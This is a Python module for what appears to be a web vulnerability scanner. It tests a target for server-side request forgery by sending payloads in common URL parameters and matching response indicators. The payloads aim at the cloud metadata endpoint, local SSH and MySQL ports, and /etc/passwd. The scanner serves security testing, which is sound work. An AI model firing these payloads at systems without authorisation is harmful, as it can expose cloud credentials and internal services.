from scanners.base import BaseScanner
from urllib.parse import quote

class SSRFScanner(BaseScanner):
    def scan(self):
        print("   [+] SSRF")
        payloads = [
            ('http://169.254.169.254/latest/meta-data/', ['ami-id', 'instance-id']),
            ('http://localhost:22', ['ssh', 'openssh']),
            ('http://127.0.0.1:3306', ['mysql']),
            ('file:///etc/passwd', ['root:']),
        ]
        params = ['url', 'uri', 'link', 'redirect', 'path']
        found = False

        for p in params:
            for payload, indicators in payloads:
                try:
                    url = f"{self.core.target_url}/?{p}={quote(payload)}"
                    r = self.get(url, timeout=8)
                    matched = [ind for ind in indicators if ind in r.text.lower()]
                    if matched:
                        ev = f"Parameter: {p}\nPayload: {payload}\nIndicators: {', '.join(matched)}\nSize: {len(r.content)}"
                        self.add(f'Possible SSRF: {p}', 'CRITICAL', 'SSRF allows internal access', 'Whitelist URLs, block internal IPs', ev, 70, 'A10:2021', 'CWE-918', 'SSRF', 'possible')
                        found = True
                        break
                except:
                    pass
            if found: break

        if not found:
            print("      OK No SSRF")
